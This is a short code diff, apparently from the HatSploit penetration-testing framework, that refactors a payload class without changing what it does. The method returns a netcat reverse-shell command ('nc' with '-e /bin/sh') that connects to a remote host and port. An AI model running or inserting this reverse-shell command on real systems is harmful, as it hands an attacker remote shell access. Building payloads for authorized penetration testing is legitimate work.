@@ -27,5 +27,4 @@ class HatSploitPayload(Payload):
         remote_host = self.handler['RHOST']
         remote_port = self.handler['RPORT']
 
-        payload = f"nc {remote_host} {remote_port} -e /bin/sh"
-        return payload
+        return f"nc {remote_host} {remote_port} -e /bin/sh"
